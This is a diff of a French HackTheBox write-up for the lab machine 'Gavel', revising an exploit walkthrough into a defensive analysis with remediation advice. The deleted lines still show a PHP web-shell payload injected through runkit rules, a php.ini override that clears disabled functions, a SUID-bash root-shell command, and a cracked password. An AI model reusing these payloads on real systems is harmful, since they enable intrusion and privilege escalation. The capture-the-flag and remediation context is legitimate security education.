@@ -1,8 +1,9 @@
 ---
 id: "HTB-2026-GAVEL"
 title: "Gavel"
-excerpt: "Sur Gavel, un dépôt Git exposé révèle une injection SQL et des identifiants administrateur, avant une RCE runkit et une élévation de privilèges par binaire SUID."
+excerpt: "Code exposé, injection SQL, règles PHP dynamiques et moteur privilégié : suivre les contrôles distincts qui échouent sur Gavel."
 date: "2025-11-29"
+updated: "2026-10-13"
 tags: ["WRITEUP", "HACKTHEBOX", "LINUX", "MEDIUM", "SQLI", "RUNKIT", "SUID-EXECUTION"]
 category: "WRITEUP"
 platform: "HACKTHEBOX"
@@ -13,67 +14,43 @@ author: "0x7CC"
 published: true
 ---
 
-## TL;DR
-Sur **Gavel**, l'accès initial commence par la découverte d'un dépôt git exposé révélant une injection SQL. Nous en extrayons les identifiants administrateur. Nous exploitons ensuite la fonction PHP `runkit_function_add` de l'interface d'administration pour obtenir une RCE en tant que `www-data`. L'élévation de privilèges s'effectue en exploitant le binaire `gavel-util` pour contourner les restrictions PHP et générer un shell SUID root.
+## Chaîne et preuves
 
----
+Le récit de Gavel décrit la récupération du source via `.git`, une injection SQL dans `inventory.php`, le mot de passe retrouvé d’`auctioneer`, une exécution web via les règles d’enchère et root via `/usr/local/bin/gavel-util`.
 
-## Cible
-- Host : `gavel.htb`
-- IP : `10.129.8.61`
+Il manque requête complète, SQL, analyse de l’exécutable et transcript du moteur. Les extraits expliquent les mécanismes sans reproduire indépendamment toute la chaîne. Distinguer fuite de source, extraction SQL et réutilisation d’identifiants.
 
----
+## Le source oriente les tests SQL
 
-## Recon : Dépôt Git et Injection SQL
-Le scan Nmap révèle le port 80. Nous découvrons un répertoire `.git` exposé. L'extraction du code source montre une vulnérabilité SQLi dans `inventory.php`.
+La cible `gavel.htb` expose SSH et une application PHP. Un répertoire Git lisible révèle parfois routes et construction des requêtes. Il ne retourne pas directement les lignes SQL : une requête vulnérable joignable et des permissions suffisantes restent nécessaires.
 
-Nous dumpons la base et obtenons :
-- Utilisateur : `auctioneer`
-- Mot de passe : `midnight1`
+Le récit rapporte la récupération d’un mot de passe bcrypt pour `auctioneer`. Il s’agit d’essais hors ligne, pas d’une inversion de bcrypt. Un résultat non autorisé minimal distingue l’injection d’un secret simplement commité dans le dépôt.
 
----
+Cet exemple PDO corrige une recherche d’inventaire par valeur :
 
-## Accès Initial : RCE via runkit
-Nous nous connectons sur `admin.php`. L'ajout de règles d'enchères utilise la fonction PHP `runkit_function_add`.
-
-Nous injectons le payload :
 ```php
-file_put_contents('../shell.php', '<?php system($_GET["c"]); ?>'); return true;
+$stmt = $pdo->prepare('SELECT name FROM inventory WHERE id = :id');
+$stmt->execute(['id' => $validatedId]);
 ```
 
-Nous déclenchons l'évaluation de la règle pour écrire notre shell, obtenons un reverse shell `www-data`, puis passons à l'utilisateur `auctioneer`.
+`$pdo` est une connexion existante et `$validatedId` un identifiant validé. [PDO::prepare](https://www.php.net/manual/en/pdo.prepare.php) sépare valeurs et syntaxe ; noms de tables et expressions de tri nécessitent des listes autorisées distinctes.
 
----
+## Les règles d’enchère sont du code
 
-## Élévation de privilèges : Abus de gavel-util
-Le binaire SUID `gavel-util` exécute des fichiers YAML de règles. Nous soumettons d'abord un fichier pour écraser `php.ini` et désactiver les fonctions interdites :
+Le récit décrit une règle modifiée par un administrateur et déclenchée via `runkit_function_add`. La [documentation runkit7](https://www.php.net/manual/en/function.runkit7-function-add.php) décrit la création de fonctions depuis du code. Confirmer l’extension et sa version, sans substituer silencieusement cette API dans le source.
 
-```yaml
-name: fixini
-rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
-```
+Un administrateur autorisé à ajuster les enchères n’est pas nécessairement autorisé à écrire du PHP exécutable. L’exploitation nécessite évaluation, droits d’écriture et accès au fichier produit. Le récit rapporte `www-data` puis une réutilisation comme `auctioneer` ; enregistrer une règle ne démontre pas ces transitions.
 
-Puis un deuxième pour copier et rendre SUID bash :
-```yaml
-name: rootshell
-rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
-```
+## Le moteur privilégié amplifie le défaut
 
----
+Le récit présente `gavel-util` comme un moteur YAML SUID et rapporte la modification de `/opt/gavel/.config/php/php.ini` avant une règle ultérieure. L’ordre compte : un fichier modifié n’influence qu’un processus qui le charge au moment approprié.
 
-## Notes défensives / remédiation
+Le bit SUID ne prouve pas que PHP conserve root. Vérifier propriétaire, UID effectif, gestion des privilèges, configuration chargée et permissions. Root est rapporté sans ces traces. Les payloads créant un shell sont retirés plutôt que présentés comme une recette complète.
 
-### Correctif
-- Empêcher l'exposition du dossier `.git`.
-- Proscrire l'évaluation dynamique de code via `runkit` sur des entrées utilisateur.
-- Ne pas accorder de droits privilégiés à des binaires qui évaluent des scripts dynamiques.
+## Remédiation et retest
 
----
+Exclure `.git` du déploiement et de l’exposition web, puis renouveler les secrets. Paramétrer les valeurs SQL et limiter les droits de base. Remplacer les règles exécutables par des données contraintes et des opérateurs explicites.
 
-## Annexe : Résumé de la timeline
-1. Extraction du dépôt git et obtention de la SQLi.
-2. RCE via injection runkit et reverse shell.
-3. Modification de php.ini via le binaire `gavel-util`.
-4. Création du shell SUID root via `gavel-util`.
+Retirer l’exécution SUID ou séparer opérations privilégiées et évaluation non fiable. Protéger la configuration et tous ses parents ; les restrictions PHP ne remplacent pas une frontière d’exécution.
 
----
+Vérifier l’inaccessibilité du dépôt, le traitement des entrées d’injection comme données, le fonctionnement des enchères et l’impossibilité d’écrire du code ou la configuration. Surveiller accès Git, écritures PHP inattendues, exécutions du moteur et changements de configuration suivis d’un interpréteur. La corrélation distingue fuite et élévation.
